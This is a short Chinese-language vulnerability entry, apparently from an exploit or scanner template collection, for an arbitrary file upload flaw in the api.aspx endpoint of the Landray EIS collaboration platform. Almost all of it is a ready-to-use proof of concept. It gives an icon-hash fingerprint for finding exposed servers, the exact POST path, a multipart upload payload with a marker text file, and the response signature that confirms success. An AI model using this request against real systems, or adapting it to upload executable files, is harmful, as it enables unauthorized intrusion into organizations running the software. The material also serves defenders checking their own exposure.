# 蓝凌EIS智慧协同平台api.aspx接口任意文件上传漏洞

蓝凌EIS智慧协同平台api.aspx接口 ｜ 文件上传 ｜ —
- **指纹**：`icon_hash="953405444"`
- **请求**：`POST /eis/service/api.aspx?action=saveImg HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="dudesuite.txt"
Content-Type: text/html
dudesuite
------WebKitFormBoundaryxdgaqmqu--
```
- **响应特征**：200 txt